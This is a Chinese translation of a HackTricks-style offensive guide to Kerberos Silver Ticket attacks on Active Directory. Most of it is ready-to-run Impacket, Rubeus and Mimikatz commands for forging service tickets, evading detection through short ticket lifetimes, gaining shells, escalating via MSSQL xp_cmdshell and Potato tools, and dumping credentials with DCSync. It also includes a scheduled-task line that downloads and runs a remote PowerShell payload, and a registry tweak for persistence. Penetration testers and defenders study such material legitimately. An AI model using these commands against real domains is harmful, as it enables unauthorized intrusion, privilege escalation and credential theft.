# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

**Silver Ticket** 攻击涉及利用 Active Directory (AD) 环境中的服务票据。此方法依赖于**获取服务账户的 NTLM 哈希**（例如计算机账户），以伪造 Ticket Granting Service (TGS) 票据。攻击者可利用伪造的票据访问网络上的特定服务，**冒充任意用户**，通常以获取管理权限为目标。使用 AES 密钥伪造票据更安全，也更难被检测到。<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Ticket 比 Golden Ticket 更难被检测到，因为它只需要**服务账户的哈希**，而不需要 krbtgt 账户的哈希。不过，它只能用于其目标服务。此外，仅窃取用户的密码也可以。
此外，如果你攻陷了一个**配置有 SPN 的账户密码**，就可以使用该密码创建 Silver Ticket，冒充该服务上的任意用户。

### 现代 Kerberos 变更（仅 AES 域）

- 从 **2022 年 11 月 8 日 (KB5021131)** 开始，Windows 更新会在可能的情况下默认使用 **AES 会话密钥**签发服务票据，并逐步淘汰 RC4。预计到 **2026 年年中**，DC 将默认禁用 RC4，因此依赖 NTLM/RC4 哈希创建 Silver Ticket 会越来越容易失败，并出现 `KRB_AP_ERR_MODIFIED`。务必提取目标服务账户的 **AES 密钥**（`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`）。<sup>[[5]](#references)</sup>
- 如果服务账户的 `msDS-SupportedEncryptionTypes` 被限制为 AES，则必须使用 `/aes256` 或 `-aesKey` 进行伪造；即使你持有 NTLM 哈希，RC4（`/rc4` 或 `-nthash`）也无法使用。<sup>[[6]](#references)</sup>
- gMSA/计算机账户每 30 天轮换一次；伪造票据前，请从 LSASS、Secretsdump/NTDS 或 DCsync 导出**当前 AES 密钥**。
- OPSEC：工具中的默认票据有效期通常为 **10 年**；应设置合理的时长（例如 `-duration 600` 分钟），以避免因有效期异常而被检测到。<sup>[[6]](#references)</sup>

根据操作系统的不同，可使用不同工具来创建票据：

### 在 Linux 上

```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### 在 Windows 上

```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
  /domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

CIFS 服务被视为访问受害者文件系统的常见目标，但 HOST 和 RPCSS 等其他服务也可用于执行任务和 WMI 查询。

### 示例：MSSQL 服务 (MSSQLSvc) + Potato 提权至 SYSTEM

如果你拥有某个**已注册的、完全匹配的 SQL 服务 SPN**所属账户的 NTLM hash（或 AES key），伪造的服务票据可能会被该服务接受。票据中的服务类和主机名必须与实际 SPN 匹配；不要假定每个安装都使用 `MSSQLSvc/`。声明的身份还必须映射到具有启用并运行 `xp_cmdshell` 所需权限的 SQL 登录名。成功执行的 `xp_cmdshell` 命令会以 SQL 服务进程身份运行（或者，对于非 sysadmin 调用者，以配置的代理身份运行）。在考虑单独使用 Potato 路径之前，先检查该**进程令牌**是否启用了 `SeImpersonatePrivilege`；仅凭服务配置或 SPN 并不能证明这一点。<sup>[[4]](#references)</sup>

```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```

- 如果当前上下文拥有 SeImpersonatePrivilege（服务帐户通常具备此权限），可使用 Potato 变体获取 SYSTEM：

```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```

更多关于滥用 MSSQL 和启用 xp_cmdshell 的详情：

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato 技术概览：

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## 可用服务

| 服务类型                                   | Silver Tickets 服务                                                      |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>根据 OS，也可能需要：</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>某些情况下，你只需请求：WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share，也包括 psexec            | CIFS                                                                       |
| LDAP 操作，包括 DCSync                     | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

使用 **Rubeus**，你可以通过以下参数**请求所有**这些票据：

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets 事件 ID

- 4624：账户登录
- 4634：账户注销
- 4672：管理员登录
- 对于同一客户端/服务，如果 **DC 上没有此前的 4768/4769 事件**，通常表明伪造的 TGS 被直接提交给了服务。
- 在 4769/4624 数据中，票据有效期异常长或加密类型不符合预期（域强制使用 AES，但实际使用 RC4）也很显眼。

## 持久化

为避免机器每 30 天轮换一次密码，可设置 `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1`；或者将 `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` 设置为大于 30 天的值，以指定机器密码的轮换周期。<sup>[[3]](#references)</sup>

## 滥用 Service tickets

在以下示例中，我们假设通过冒充管理员账户获取了票据。

### CIFS

使用此票据，你可以通过 **SMB** 访问 `C$` 和 `ADMIN$` 文件夹（如果它们已开放），并将文件复制到远程文件系统中的某个位置，只需执行类似以下操作：

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

你还可以在主机中获取 shell，或使用 **psexec** 执行任意命令：

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

拥有此权限后，你可以在远程计算机上创建计划任务并执行任意命令：

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

使用这些 tickets，你可以在受害者系统中**执行 WMI**：

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

查找以下页面，了解 **wmiexec** 的更多信息：


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

通过 winrm 访问一台计算机后，你可以**访问它**，甚至获取一个 PowerShell：

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

查看以下页面，了解使用 winrm 连接远程主机的**更多方式**：


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> 请注意，远程计算机上必须启用并监听 **winrm**，才能访问它。

### LDAP

拥有此权限后，你可以使用 **DCSync** 转储 DC 数据库：

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**在以下页面了解更多关于 DCSync 的信息：**


{{#ref}}
dcsync.md
{{#endref}}


## References

- [1] [Kerberos：Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos（II）：如何攻击 Kerberos？- Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [机器帐户密码流程 - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf：Silver Ticket + Potato 路径](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos 加固与 RC4 弃用](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Impacket ticketer.py 当前选项（AES/keytab/持续时间）](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
{{#include ../../banners/hacktricks-training.md}}
